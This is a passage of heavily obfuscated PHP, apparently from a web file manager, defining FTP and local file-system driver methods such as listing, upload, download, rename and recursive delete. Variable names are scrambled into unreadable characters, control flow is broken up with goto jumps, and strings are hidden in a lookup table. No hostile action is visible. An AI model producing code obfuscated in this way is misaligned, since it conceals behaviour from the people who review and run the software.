EòÇ‘•£è»; EòÇ‘•£è»: $b¼Ó†ŞÒ É =& $_SERVER[¹Ò‹Ò¹]; if (!$this->_isconn()) { return !1; } $F­ù½Ş“ñË = $this->fileNameAuto($this->pathFather($eÔæ¶æ‡…), $BÎ‹‹ÙÔ‚); goto F˜‰Áë†Ï; a±Â¾ÉÀ¿º: return $få”ÚÎ±œÎ ? $this->getPathOuter($Aá›ä²¾‹‡) : !1; goto d²¢´ŠÉ‹¤; D…Â¹™òÌ: $Aá›ä²¾‹‡ = rtrim($DÔ§¦©£ ‘, $b¼Ó†ŞÒ É[8]) . $b¼Ó†ŞÒ É[8] . $F­ù½Ş“ñË; $få”ÚÎ±œÎ = @ftp_rename($this->connect, $eÔæ¶æ‡…, $Aá›ä²¾‹‡); $Aá›ä²¾‹‡ = $this->iconvApp($Aá›ä²¾‹‡); goto a±Â¾ÉÀ¿º; F˜‰Áë†Ï: $F­ù½Ş“ñË = $this->iconvSystem($F­ù½Ş“ñË); $eÔæ¶æ‡… = $this->iconvSystem($eÔæ¶æ‡…); $DÔ§¦©£ ‘ = $this->pathFather($eÔæ¶æ‡…); goto D…Â¹™òÌ; d²¢´ŠÉ‹¤: } private function folderInfo($F«¾ˆÌº¼ƒ, $bŠ®¸£¡º  = false) { $B¥îÉîë =& $_SERVER[¹Ò‹Ò¹]; $d·¡ºÚ»ø = array($B¥îÉîë[28] => $this->pathThis($F«¾ˆÌº¼ƒ), $B¥îÉîë[75] => $this->getPathOuter($B¥îÉîë[8] . $F«¾ˆÌº¼ƒ), $B¥îÉîë[29] => $B¥îÉîë[76]); if ($bŠ®¸£¡º ) { return $d·¡ºÚ»ø; } $d·¡ºÚ»ø[$B¥îÉîë[192]] = $d·¡ºÚ»ø[$B¥îÉîë[83]] = 0; $d·¡ºÚ»ø[$B¥îÉîë[193]] = $d·¡ºÚ»ø[$B¥îÉîë[194]] = !0; return $d·¡ºÚ»ø; } private function fileInfo($céù–ÂÄŠµ, $fÊ¼©¸—¦ = false, $f’¾„éØîˆ = array()) { goto Cë¸¢ä­§¹; EŠ°ö•ÌİÖ: $a¢´İ÷®¡ø[$dÌÉäÎÌì»[192]] = $a¢´İ÷®¡ø[$dÌÉäÎÌì»[83]] = 0; $a¢´İ÷®¡ø[$dÌÉäÎÌì»[193]] = $a¢´İ÷®¡ø[$dÌÉäÎÌì»[194]] = !0; $b†—ôæ¸™ = $this->iconvSystem($céù–ÂÄŠµ); goto Bå‡á¢¿¸—; dã¼ë†ò’ì: return $a¢´İ÷®¡ø; goto Eğé‡ÓÆº; Bå‡á¢¿¸—: $a¢´İ÷®¡ø[$dÌÉäÎÌì»[83]] = @ftp_mdtm($this->connect, $b†—ôæ¸™); if (empty($f’¾„éØîˆ)) { $f’¾„éØîˆ = $this->objectMeta($céù–ÂÄŠµ); if (!$f’¾„éØîˆ) { return $a¢´İ÷®¡ø; } } $a¢´İ÷®¡ø[$dÌÉäÎÌì»[77]] = $f’¾„éØîˆ[$dÌÉäÎÌì»[77]]; goto dã¼ë†ò’ì; Cë¸¢ä­§¹: $dÌÉäÎÌì» =& $_SERVER[¹Ò‹Ò¹]; $a¢´İ÷®¡ø = array($dÌÉäÎÌì»[28] => $this->pathThis($céù–ÂÄŠµ), $dÌÉäÎÌì»[75] => $this->getPathOuter($dÌÉäÎÌì»[8] . $céù–ÂÄŠµ), $dÌÉäÎÌì»[29] => $dÌÉäÎÌì»[191], $dÌÉäÎÌì»[77] => isset($f’¾„éØîˆ[$dÌÉäÎÌì»[77]]) ? $f’¾„éØîˆ[$dÌÉäÎÌì»[77]] : 0, $dÌÉäÎÌì»[167] => $this->ext($céù–ÂÄŠµ)); if ($fÊ¼©¸—¦) { return $a¢´İ÷®¡ø; } goto EŠ°ö•ÌİÖ; Eğé‡ÓÆº: } public function size($aÌÔâ²•Ğæ) { $B¶Î¡ÑˆËÓ = $this->objectMeta($aÌÔâ²•Ğæ); return $B¶Î¡ÑˆËÓ ? $B¶Î¡ÑˆËÓ[$_SERVER[¹Ò‹Ò¹][77]] : 0; } public function info($bÙİõÚ¡¶ß) { if ($this->isFile($bÙİõÚ¡¶ß)) { return $this->fileInfo($bÙİõÚ¡¶ß, 0); } else { if ($this->isFolder($bÙİõÚ¡¶ß)) { return $this->folderInfo($bÙİõÚ¡¶ß); } } return !1; } private function fileList($A…¦îØ™Ú°, &$E’“º…ñ‚Ã, &$bÈŸÇŠÌÙ×, $eÊ¯‚ç§ = false) { goto d¶ºšù°©à; dŠÑ×İÈæë: @ftp_chdir($this->connect, $E‘Ü¥ù¿Š[8]); $A…¦îØ™Ú° = rtrim($A…¦îØ™Ú°, $E‘Ü¥ù¿Š[8]) . $E‘Ü¥ù¿Š[8]; check_abort(); goto D‡•Ğ² âÃ; D‡•Ğ² âÃ: $AˆÅ½´¶É = $this->listItemCache === !1 ? !1 : !0; $f¹‘çª×· = @ftp_rawlist($this->connect, $A…¦îØ™Ú°); if (!$f¹‘çª×·) { $f¹‘çª×· = array(); } goto D«”íäšÒ“; d¶ºšù°©à: $E‘Ü¥ù¿Š =& $_SERVER[¹Ò‹Ò¹]; $A…¦îØ™Ú° = $this->iconvSystem($A…¦îØ™Ú°); if (!$this->isFolder($A…¦îØ™Ú°)) { return !1; } goto dŠÑ×İÈæë; D«”íäšÒ“: $F™ÉõÌ’ÑÛ = array($E‘Ü¥ù¿Š[94] => 1, $E‘Ü¥ù¿Š[1227] => 1); foreach ($f¹‘çª×· as $DæÉ³ëö£Ö) { goto CªôÛì½¦; e¢ñÈÒ«¹: if ($EİŒŞÎ) { $E’“º…ñ‚Ã[] = $bä‹ƒä¹³“; if ($eÊ¯‚ç§) { $this->fileList($bä‹ƒä¹³“, $E’“º…ñ‚Ã, $bÈŸÇŠÌÙ×, $eÊ¯‚ç§); } continue; } $bÈŸÇŠÌÙ×[] = $B­—‹×÷Œ; goto FïîÑéö; fò”Óãâòã: if (substr($DæÉ³ëö£Ö, 0, 1) == $E‘Ü¥ù¿Š[1228]) { $B­—‹×÷Œ[$E‘Ü¥ù¿Š[29]] = $E‘Ü¥ù¿Š[76]; $B­—‹×÷Œ[$E‘Ü¥ù¿Š[77]] = 0; } $EİŒŞÎ = $B­—‹×÷Œ[$E‘Ü¥ù¿Š[29]] == $E‘Ü¥ù¿Š[76] ? !0 : !1; if ($AˆÅ½´¶É) { $this->cacheMethod($E‘Ü¥ù¿Š[197], $bä‹ƒä¹³“, $EİŒŞÎ); $this->cacheMethod($E‘Ü¥ù¿Š[198], $bä‹ƒä¹³“, $B­—‹×÷Œ); } goto e¢ñÈÒ«¹; E–¸¨Úø¶Ô: if (!$bä‹ƒä¹³“ || isset($F™ÉõÌ’ÑÛ[$bä‹ƒä¹³“])) { continue; } $bä‹ƒä¹³“ = $this->iconvApp($A…¦îØ™Ú° . ltrim($bä‹ƒä¹³“, $E‘Ü¥ù¿Š[8])); $B­—‹×÷Œ = array($E‘Ü¥ù¿Š[28] => $bä‹ƒä¹³“, $E‘Ü¥ù¿Š[29] => $E‘Ü¥ù¿Š[191], $E‘Ü¥ù¿Š[77] => $FÇŠ„Úã§Ø[4]); goto fò”Óãâòã; CªôÛì½¦: $FÇŠ„Úã§Ø = $this->_listItem($DæÉ³ëö£Ö); if ($FÇŠ„Úã§Ø[0] == $E‘Ü¥ù¿Š[710]) { continue; } $bä‹ƒä¹³“ = $FÇŠ„Úã§Ø[8]; goto E–¸¨Úø¶Ô; FïîÑéö: } if ($AˆÅ½´¶É) { $this->cacheMethod($E‘Ü¥ù¿Š[197], $A…¦îØ™Ú°, !0); } goto d‰„Ú¨‘Ÿí; d‰„Ú¨‘Ÿí: } private function _listItem($fßÖ¢‹ÔËì) { if (empty($fßÖ¢‹ÔËì)) { return array(); } $B‰íËŞŞñô = preg_split($_SERVER[¹Ò‹Ò¹][1229], $fßÖ¢‹ÔËì); if (count($B‰íËŞŞñô) <= 9) { return $B‰íËŞŞñô; } $B‰íËŞŞñô[8] = trim(substr($fßÖ¢‹ÔËì, strpos($fßÖ¢‹ÔËì, $B‰íËŞŞñô[7]) + strlen($B‰íËŞŞñô[7]))); return array_splice($B‰íËŞŞñô, 0, 9); } public function listPath($fâÏ×Áìç¦, $e¬‹™£š´“ = false) { goto aÍ·ÚËÀĞ; b†•ßÒÁ¸: return array($F‹ÖÍó‰Îß[74] => $aìç›ïš», $F‹ÖÍó‰Îß[73] => $BÈ—®¸¤); goto eÍ­İÍŠ; aÍ·ÚËÀĞ: $F‹ÖÍó‰Îß =& $_SERVER[¹Ò‹Ò¹]; if (!$this->_isconn()) { return !1; } $aìç›ïš» = $BÈ—®¸¤ = array(); goto C×à²ô‘„×; C×à²ô‘„×: $this->fileList($fâÏ×Áìç¦, $aìç›ïš», $BÈ—®¸¤); foreach ($aìç›ïš» as $fÅµÎóª‚ => $eÎƒÓÀîƒì) { $aìç›ïš»[$fÅµÎóª‚] = $this->folderInfo($eÎƒÓÀîƒì, $e¬‹™£š´“); } foreach ($BÈ—®¸¤ as $fÅµÎóª‚ => $eÎƒÓÀîƒì) { $BÈ—®¸¤[$fÅµÎóª‚] = $this->fileInfo($eÎƒÓÀîƒì[$F‹ÖÍó‰Îß[28]], $e¬‹™£š´“, $eÎƒÓÀîƒì); } goto b†•ßÒÁ¸; eÍ­İÍŠ: } public function has($DãÀÒ†‰°, $f›‡×ï‡ˆ = false, $d²Ë±ÄöÉÚ = true) { goto Fõš’«Œğ…; Fõš’«Œğ…: $cä”ïæöÎæ =& $_SERVER[¹Ò‹Ò¹]; $Bø½äÜÇê¨ = $A¯ìÚ…¨Ü = array(); $f•¡ìÀ„ùÁ = $f›‡×ï‡ˆ ? !0 : !1; goto b¯¶¼çÏŒ†; b¯¶¼çÏŒ†: $this->fileList($DãÀÒ†‰°, $Bø½äÜÇê¨, $A¯ìÚ…¨Ü, $f•¡ìÀ„ùÁ); if ($f›‡×ï‡ˆ) { return array($cä”ïæöÎæ[201] => count($A¯ìÚ…¨Ü), $cä”ïæöÎæ[202] => count($Bø½äÜÇê¨)); } if ($d²Ë±ÄöÉÚ) { if (count($A¯ìÚ…¨Ü)) { return !0; } } else { if (count($Bø½äÜÇê¨)) { return !0; } } goto D‹˜”‘’Ç; D‹˜”‘’Ç: return !1; goto C†»âÛñÆ; C†»âÛñÆ: } public function listAll($Eñˆ¤ñ·â) { goto b½äĞá£š; F™‘õÉòŠù: $this->fileList($Eñˆ¤ñ·â, $Eô×¬ê­Ÿ”, $E•°˜èËíê, !0); $B¯†ÔíÜİó = array(); foreach ($E•°˜èËíê as $Bõ™ˆ¢ñÅå) { $B¯†ÔíÜİó[$Bõ™ˆ¢ñÅå[$B“¥áÇœ²Ô[28]]] = $Bõ™ˆ¢ñÅå[$B“¥áÇœ²Ô[77]]; } goto Aø‡¼œËÀ; b½äĞá£š: $B“¥áÇœ²Ô =& $_SERVER[¹Ò‹Ò¹]; if (!$this->_isconn()) { return !1; } $Eô×¬ê­Ÿ” = $E•°˜èËíê = array(); goto F™‘õÉòŠù; Aø‡¼œËÀ: foreach ($Eô×¬ê­Ÿ” as $Bõ™ˆ¢ñÅå) { if (is_string($Bõ™ˆ¢ñÅå)) { $B¯†ÔíÜİó[$Bõ™ˆ¢ñÅå] = 0; } } return $this->listAllFiles($Eñˆ¤ñ·â, array_keys($B¯†ÔíÜİó), $B¯†ÔíÜİó); goto A´èœÛßí¡; A´èœÛßí¡: } public function getContent($FÜ¨±Ì‹ÆÀ) { if (!$this->_isconn()) { return !1; } $FÜ¨±Ì‹ÆÀ = $this->iconvSystem($FÜ¨±Ì‹ÆÀ); return $this->fileSubstr($FÜ¨±Ì‹ÆÀ); } public function setContent($a¦ÖÈè‚ãÌ, $föåóŠèÆ = '') { goto a…‡ÙšÒ¿; C½Ëß»à¹: file_put_contents($Dáô‡Ê÷Ô˜, $föåóŠèÆ); $dµÒ²ÁÅÀƒ = $this->upload($a¦ÖÈè‚ãÌ, $this->iconvApp($Dáô‡Ê÷Ô˜)); $this->tempFileRemve($Dáô‡Ê÷Ô˜); goto F•ÏÓµë†; a…‡ÙšÒ¿: if (!$this->_isconn()) { return !1; } $EÍˆŸ ¿Õ¥ = $this->pathThis($this->iconvSystem($a¦ÖÈè‚ãÌ)); $Dáô‡Ê÷Ô˜ = $this->tempFile($EÍˆŸ ¿Õ¥); goto C½Ëß»à¹; F•ÏÓµë†: return $dµÒ²ÁÅÀƒ; goto b®ù‹ÙÀğå; b®ù‹ÙÀğå: } public function fileSubstr($BˆÇÇËƒÏ–, $C‡Ñ¶Õ¢¢‚ = 0, $bß¬ïÉˆ¿’ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($BˆÇÇËƒÏ–, $C‡Ñ¶Õ¢¢‚, $bß¬ïÉˆ¿’); } private function ftpRequest($bØò›ƒ…÷Ù, $CÖÂ¼˜ÉÕã = 0, $c¦öƒÈİÏ = false) { goto b·ø›ô†Àå; cô…Š¯Æø­: curl_setopt($bäêÛ•Ø¤È, CURLOPT_RETURNTRANSFER, 1); $b ¬ÓÁİğ’ = curl_exec($bäêÛ•Ø¤È); curl_close($bäêÛ•Ø¤È); goto cõÈ½à»Å; cõÈ½à»Å: return $b ¬ÓÁİğ’; goto Cœ´ğï–”¦; eÉÏÖî’­°: curl_setopt($bäêÛ•Ø¤È, CURLOPT_URL, $Dçõ„¤“·„ . $this->pathEncode($bØò›ƒ…÷Ù)); curl_setopt($bäêÛ•Ø¤È, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($c¦öƒÈİÏ) { $dí®Éù²¢ò = $CÖÂ¼˜ÉÕã + $c¦öƒÈİÏ - 1; curl_setopt($bäêÛ•Ø¤È, CURLOPT_RANGE, "{$CÖÂ¼˜ÉÕã}\55{$dí®Éù²¢ò}"); } goto cô…Š¯Æø­; b·ø›ô†Àå: $bØò›ƒ…÷Ù = $this->iconvSystem($bØò›ƒ…÷Ù); $Dçõ„¤“·„ = $this->scheme . $this->host . $_SERVER[¹Ò‹Ò¹][4] . $this->port; $bäêÛ•Ø¤È = curl_init(); goto eÉÏÖî’­°; Cœ´ğï–”¦: } public function upload($FòÖ”Æ˜ø, $CŒÆÎ‘±á, $fğ•è…í¸Ü = false, $B‹› ‹ = REPEAT_REPLACE) { goto C…æœ®ç…Ğ; dé•Ë™ğ: if ($Cß›Øˆ­‚ != FTP_FINISHED) { return !1; } return $this->getPathOuter($FòÖ”Æ˜ø); goto F¼‡¥É˜¬; E¢†„ç´°‹: $CŒÆÎ‘±á = $this->iconvSystem($CŒÆÎ‘±á); $Cß›Øˆ­‚ = ftp_nb_put($this->connect, $FòÖ”Æ˜ø, $CŒÆÎ‘±á, FTP_BINARY); while ($Cß›Øˆ­‚ == FTP_MOREDATA) { $Cß›Øˆ­‚ = ftp_nb_continue($this->connect); } goto dé•Ë™ğ; C…æœ®ç…Ğ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FòÖ”Æ˜ø))) { return !1; } $FòÖ”Æ˜ø = $this->iconvSystem($FòÖ”Æ˜ø); goto E¢†„ç´°‹; F¼‡¥É˜¬: } public function download($aĞğ½İÛ‘, $D»Ã»²­Ûä = '') { goto bË‹’µ‘è; BŒÒÛ÷´ãà: while ($eŞÙÍãŞîõ == FTP_MOREDATA) { $eŞÙÍãŞîõ = ftp_nb_continue($this->connect); } if ($eŞÙÍãŞîõ != FTP_FINISHED) { return !1; } return $this->iconvApp($D»Ã»²­Ûä); goto fßÌ—†­‘™; EÒ‘‚Š¥µ: $aĞğ½İÛ‘ = $this->iconvSystem($aĞğ½İÛ‘); $D»Ã»²­Ûä = $this->iconvSystem($D»Ã»²­Ûä); $eŞÙÍãŞîõ = ftp_nb_get($this->connect, $D»Ã»²­Ûä, $aĞğ½İÛ‘, FTP_BINARY); goto BŒÒÛ÷´ãà; bË‹’µ‘è: if (!$this->_isconn()) { return !1; } $C¯¬Á•ÛçÅ = $this->pathFather($D»Ã»²­Ûä); if (!IO::mkdir($C¯¬Á•ÛçÅ)) { return !1; } goto EÒ‘‚Š¥µ; fßÌ—†­‘™: } public function exist($c†¡·Š¼”) { return $this->isFile($c†¡·Š¼”) || $this->isFolder($c†¡·Š¼”); } public function isFile($b… œÆõùƒ) { return !$this->isFolder($b… œÆõùƒ) && $this->objectMeta($b… œÆõùƒ); } public function isFolder($dëëâ”ÎÂ›) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][197], $dëëâ”ÎÂ›); } protected function objectMeta($a„•ÂÖ³£¶) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][198], $a„•ÂÖ³£¶); } protected function _objectMeta($AäŠÇÙ«ö) { goto Cß¾Ÿ†ä…º; d°øš¯Ò»–: $DÚŒ¾ÏÅ–ä = @ftp_size($this->connect, $AäŠÇÙ«ö); if ($DÚŒ¾ÏÅ–ä != -1) { $fŸØ‡ï¾À[$BåÕíÆÃÎƒ[77]] = $DÚŒ¾ÏÅ–ä; } else { $c‘œ¯ĞºÒ = @ftp_chdir($this->connect, $AäŠÇÙ«ö); if (!$c‘œ¯ĞºÒ) { return !1; } $fŸØ‡ï¾À[$BåÕíÆÃÎƒ[29]] = $BåÕíÆÃÎƒ[76]; } return $fŸØ‡ï¾À; goto eÛÃÒÒÉŸ¦; Cß¾Ÿ†ä…º: $BåÕíÆÃÎƒ =& $_SERVER[¹Ò‹Ò¹]; if ($AäŠÇÙ«ö == $BåÕíÆÃÎƒ[33] || $AäŠÇÙ«ö == $BåÕíÆÃÎƒ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto aàÑ–á‰; aàÑ–á‰: $AäŠÇÙ«ö = $this->iconvSystem($AäŠÇÙ«ö); $fŸØ‡ï¾À = array($BåÕíÆÃÎƒ[28] => $this->iconvApp($AäŠÇÙ«ö), $BåÕíÆÃÎƒ[29] => $BåÕíÆÃÎƒ[191], $BåÕíÆÃÎƒ[77] => 0); @ftp_chdir($this->connect, $BåÕíÆÃÎƒ[8]); goto d°øš¯Ò»–; eÛÃÒÒÉŸ¦: } protected function _isFolder($B†Ğƒ»Ãß) { $F×¦ˆ¿ÂÚ’ =& $_SERVER[¹Ò‹Ò¹]; if ($B†Ğƒ»Ãß == $F×¦ˆ¿ÂÚ’[33] || $B†Ğƒ»Ãß == $F×¦ˆ¿ÂÚ’[8]) { return !0; } $eäÄ˜ç™ó = $this->_objectMeta($B†Ğƒ»Ãß); return isset($eäÄ˜ç™ó[$F×¦ˆ¿ÂÚ’[29]]) && $eäÄ˜ç™ó[$F×¦ˆ¿ÂÚ’[29]] == $F×¦ˆ¿ÂÚ’[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Dˆõ§º­…ß) { if (substr($Dˆõ§º­…ß, 0, 2) == $_SERVER[¹Ò‹Ò¹][1220]) { $Dˆõ§º­…ß = BASIC_PATH . substr($Dˆõ§º­…ß, 2); } return $Dˆõ§º­…ß; } public function iconvApp($cÓâøÊˆÚ“) { $c†éÀ±©ãÆ =& $_SERVER[¹Ò‹Ò¹]; global $config; return $this->iconvTo($cÓâøÊˆÚ“, $config[$c†éÀ±©ãÆ[1218]], $config[$c†éÀ±©ãÆ[1217]]); } public function iconvSystem($CÚÆÆµ¡Å) { $EÉù˜ˆäŸ° =& $_SERVER[¹Ò‹Ò¹]; global $config; return $this->iconvTo($CÚÆÆµ¡Å, $config[$EÉù˜ˆäŸ°[1217]], $config[$EÉù˜ˆäŸ°[1218]]); } public function getPathOuter($EùÒò ïù) { goto bŞŠ¬ÙŒĞ; bŞŠ¬ÙŒĞ: $fÛøùŠËĞ =& $_SERVER[¹Ò‹Ò¹]; $aô÷õÍÖ¸ = $this->iconvApp($this->pathBase); $EùÒò ïù = $this->iconvApp($EùÒò ïù); goto eÙÌµ‰ğÀ; eÙÌµ‰ğÀ: if (substr($aô÷õÍÖ¸, 0, 2) == $fÛøùŠËĞ[1220]) { $aô÷õÍÖ¸ = BASIC_PATH . substr($aô÷õÍÖ¸, 2); } if (substr($EùÒò ïù, 0, 2) == $fÛøùŠËĞ[1220]) { $EùÒò ïù = BASIC_PATH . substr($EùÒò ïù, 2); } $aô÷õÍÖ¸ = KodIO::clear($aô÷õÍÖ¸); goto E¬¦´š½¢ ; E¬¦´š½¢ : $EùÒò ïù = KodIO::clear($EùÒò ïù); $EùÒò ïù = substr($EùÒò ïù, strlen($aô÷õÍÖ¸)); if (empty($this->pathDriver)) { return $EùÒò ïù; } goto fà¥˜½Ğ±ƒ; fà¥˜½Ğ±ƒ: return $this->pathDriver . $fÛøùŠËĞ[8] . ltrim($EùÒò ïù, $fÛøùŠËĞ[8]); goto fôã¨°ƒî; fôã¨°ƒî: } public function mkfile($BÛ¢èõª‘¢, $cÂİ›âÎğ = '', $bç´Œ•âØ£ = REPEAT_RENAME) { $BÛ¢èõª‘¢ = $this->iconvSystem($BÛ¢èõª‘¢); @touch($BÛ¢èõª‘¢); if ($cÂİ›âÎğ) { file_put_contents($BÛ¢èõª‘¢, $cÂİ›âÎğ); } return is_file($BÛ¢èõª‘¢) ? $this->getPathOuter($BÛ¢èõª‘¢) : !1; } public function mkdir($b¦†ÀÜ†™, $A‚åèØØÜì = REPEAT_SKIP) { $b¦†ÀÜ†™ = $this->iconvSystem($b¦†ÀÜ†™); if (is_dir($b¦†ÀÜ†™)) { return $this->getPathOuter($b¦†ÀÜ†™); } @mkdir($b¦†ÀÜ†™, 511, !0); return is_dir($b¦†ÀÜ†™) ? $this->getPathOuter($b¦†ÀÜ†™) : !1; } public function copyFile($d²åÕ• Êñ, $F¸³£»Û¾¶) { $this->mkdir($this->pathFather($F¸³£»Û¾¶)); $d²åÕ• Êñ = $this->iconvSystem($d²åÕ• Êñ); $F¸³£»Û¾¶ = $this->iconvSystem($F¸³£»Û¾¶); $eŞÎ¹‡Å = copy_64($d²åÕ• Êñ, $F¸³£»Û¾¶); return $eŞÎ¹‡Å ? $this->getPathOuter($F¸³£»Û¾¶) : !1; } public function moveFile($f°‚Œñ„£Å, $Eº¿ôëŠ„) { $this->mkdir($this->pathFather($Eº¿ôëŠ„)); $f°‚Œñ„£Å = $this->iconvSystem($f°‚Œñ„£Å); $Eº¿ôëŠ„ = $this->iconvSystem($Eº¿ôëŠ„); $BöáÉù½Ã = intval(@rename($f°‚Œñ„£Å, $Eº¿ôëŠ„)); if (!$BöáÉù½Ã) { if ($BöáÉù½Ã = intval(@copy_64($f°‚Œñ„£Å, $Eº¿ôëŠ„))) { @unlink($f°‚Œñ„£Å); } } return $BöáÉù½Ã ? $this->getPathOuter($Eº¿ôëŠ„) : !1; } public function delFile($eèØñ’£·Œ) { $eèØñ’£·Œ = $this->iconvSystem($eèØñ’£·Œ); if (!@unlink($eèØñ’£·Œ)) { @chmod($eèØñ’£·Œ, 511); if (!@unlink($eèØñ’£·Œ)) { return !1; } } else { return !0; } } public function delFolder($f•È’À¹ë) { goto bØÅ‘ªÌÊä; F‰×…Åóã: return rmdir($f•È’À¹ë); goto Eº‚µ®êù; fèïŠã¸İ: if (!($aƒÔğ«ù™’ = opendir($f•È’À¹ë))) { return !1; } while (($c’ã‡‹˜â = readdir($aƒÔğ«ù™’)) !== !1) { if ($c’ã‡‹˜â == $Aµö¬”¾Î[94] || $c’ã‡‹˜â == $Aµö¬”¾Î[1227]) { continue; } $AõÄ•‹é”œ = $f•È’À¹ë . $Aµö¬”¾Î[8] . $c’ã‡‹˜â; if (is_file($AõÄ•‹é”œ) || is_link($AõÄ•‹é”œ)) { if (!unlink($AõÄ•‹é”œ)) { chmod($AõÄ•‹é”œ, 511); if (!unlink($AõÄ•‹é”œ)) { return !1; } } } else { if (is_dir($AõÄ•‹é”œ)) { chmod($AõÄ•‹é”œ, 511); $AõÄ•‹é”œ = $this->iconvApp($AõÄ•‹é”œ); if (!$this->delFolder($AõÄ•‹é”œ)) { return !1; } } } } closedir($aƒÔğ«ù™’); goto F‰×…Åóã; bØÅ‘ªÌÊä: $Aµö¬”¾Î =& $_SERVER[¹Ò‹Ò¹]; $f•È’À¹ë = $this->iconvSystem($f•È’À¹ë); if (!is_dir($f•È’À¹ë)) { return !0; } goto fèïŠã¸İ; Eº‚µ®êù: } public function rename($BËŠÕ¥ßš¿, $dØÍç‚µÕ­) { goto fèôŞã®ŒÊ; fèôŞã®ŒÊ: $e†´ƒèÑè =& $_SERVER[¹Ò‹Ò¹]; $BãÊíÆ‰ÆÓ = $this->fileNameAuto($this->pathFather($BËŠÕ¥ßš¿), $dØÍç‚µÕ­); $BãÊíÆ‰ÆÓ = $this->iconvSystem($BãÊíÆ‰ÆÓ); goto d÷öİæç÷Œ; d÷öİæç÷Œ: $BËŠÕ¥ßš¿ = $this->iconvSystem($BËŠÕ¥ßš¿); $c¢ÍŠ£ğÓ = $this->pathFather($BËŠÕ¥ßš¿); $fïõª•âÆ‡ = rtrim($c¢ÍŠ£ğÓ, $e†´ƒèÑè[8]) . $e†´ƒèÑè[8] . $BãÊíÆ‰ÆÓ; goto CÙ„§ñ•éª; CÙ„§ñ•éª: $eøÔ”´ … = @rename($BËŠÕ¥ßš¿, $fïõª•âÆ‡); $fïõª•âÆ‡ = $this->iconvApp($fïõª•âÆ‡); return $eøÔ”´ … ? $this->getPathOuter($fïõª•âÆ‡) : !1; goto c°ªÄ‡Ï¦ˆ; c°ªÄ‡Ï¦ˆ: } public function size($a¿‚ÛßëÖ¼) { $a¿‚ÛßëÖ¼ = $this->iconvSystem($a¿‚ÛßëÖ¼); return filesize_64($a¿‚ÛßëÖ¼); } public function info($fç®©¯Ğ‘ğ) { $fç®©¯Ğ‘ğ = $this->iconvSystem($fç®©¯Ğ‘ğ); if ($this->isFolder($fç®©¯Ğ‘ğ)) { return $this->folderInfo($fç®©¯Ğ‘ğ); } else { if ($this->isFile($fç®©¯Ğ‘ğ)) { return $this->fileInfo($fç®©¯Ğ‘ğ); } } return !1; } protected function infoChildren($cÅ‡Ü…œÛÏ, &$aŸ Š¼ÏÇº, $a¥Î½ˆÛ = true) { goto EÜŠÈÚÂ; a¥ŠŞ‘¥Ÿ : if ($a¥Î½ˆÛ) { $cÅ‡Ü…œÛÏ = $this->iconvSystem($cÅ‡Ü…œÛÏ); } if (!($E«ò¨õòÌ = @opendir($cÅ‡Ü…œÛÏ))) { return; } while (($f¤‘ñ¤õ£® = readdir($E«ò¨õòÌ)) !== !1) { if ($f¤‘ñ¤õ£® == $b ‹ó‚¶[94] || $f¤‘ñ¤õ£® == $b ‹ó‚¶[1227]) { continue; } $F›„íƒÀ®í = $cÅ‡Ü…œÛÏ . $f¤‘ñ¤õ£®; if (is_file($F›„íƒÀ®í) || is_link($F›„íƒÀ®í)) { $aŸ Š¼ÏÇº[$b ‹ó‚¶[78]]++; $aŸ Š¼ÏÇº[$b ‹ó‚¶[77]] += filesize_64($F›„íƒÀ®í); } else { if (is_dir($F›„íƒÀ®í)) { $aŸ Š¼ÏÇº[$b ‹ó‚¶[79]]++; $this->infoChildren($F›„íƒÀ®í, $aŸ Š¼ÏÇº, !1); } } } goto døÖ÷—‘´ª; EÜŠÈÚÂ: $b ‹ó‚¶ =& $_SERVER[¹Ò‹Ò¹]; check_abort_echo(); $cÅ‡Ü…œÛÏ = rtrim($cÅ‡Ü…œÛÏ, $b ‹ó‚¶[8]) . $b ‹ó‚¶[8]; goto a¥ŠŞ‘¥Ÿ ; døÖ÷—‘´ª: closedir($E«ò¨õòÌ); goto d‹šÆ§†íª; d‹šÆ§†íª: } private function folderInfo($B—ñ”‡İï×, $dø¾ƒµ†™¶ = false) { $D¨™×ôˆ¦ =& $_SERVER[¹Ò‹Ò¹]; $B—ñ”‡İï× = rtrim($B—ñ”‡İï×, $D¨™×ôˆ¦[8]) . $D¨™×ôˆ¦[8]; $f±¬¼ŠÍï¬ = $this->iconvApp($this->pathThis($B—ñ”‡İï×)); if ($dø¾ƒµ†™¶) { return array($D¨™×ôˆ¦[28] => $f±¬¼ŠÍï¬, $D¨™×ôˆ¦[75] => $this->getPathOuter($B—ñ”‡İï×), $D¨™×ôˆ¦[29] => $D¨™×ôˆ¦[76]); } $C“â¯ŠÒŞ = array($D¨™×ôˆ¦[28] => $f±¬¼ŠÍï¬, $D¨™×ôˆ¦[75] => $this->getPathOuter($B—ñ”‡İï×), $D¨™×ôˆ¦[29] => $D¨™×ôˆ¦[76], $D¨™×ôˆ¦[192] => @filectime($B—ñ”‡İï×), $D¨™×ôˆ¦[83] => @filemtime($B—ñ”‡İï×), $D¨™×ôˆ¦[1230] => @fileatime($B—ñ”‡İï×), $D¨™×ôˆ¦[1231] => is_readable($B—ñ”‡İï×), $D¨™×ôˆ¦[1232] => is_writable($B—ñ”‡İï×), $D¨™×ôˆ¦[1233] => get_mode($B—ñ”‡İï×)); return $C“â¯ŠÒŞ; } private function fileInfo($C¥êº—‚½, $Fì–ôƒ¯ì = false) { $Eâ—˜½‡± =& $_SERVER[¹Ò‹Ò¹]; $AØ¯Ë”‰ÕÂ = $this->iconvApp($this->pathThis($C¥êº—‚½)); if ($Fì–ôƒ¯ì) { return array($Eâ—˜½‡±[28] => $AØ¯Ë”‰ÕÂ, $Eâ—˜½‡±[75] => $this->getPathOuter($C¥êº—‚½), $Eâ—˜½‡±[29] => $Eâ—˜½‡±[191], $Eâ—˜½‡±[77] => $this->size($C¥êº—‚½), $Eâ—˜½‡±[167] => $this->ext($AØ¯Ë”‰ÕÂ)); } $cÊ«¯‚£ç± = array($Eâ—˜½‡±[28] => $AØ¯Ë”‰ÕÂ, $Eâ—˜½‡±[75] => $this->getPathOuter($C¥êº—‚½), $Eâ—˜½‡±[29] => $Eâ—˜½‡±[191], $Eâ—˜½‡±[192] => 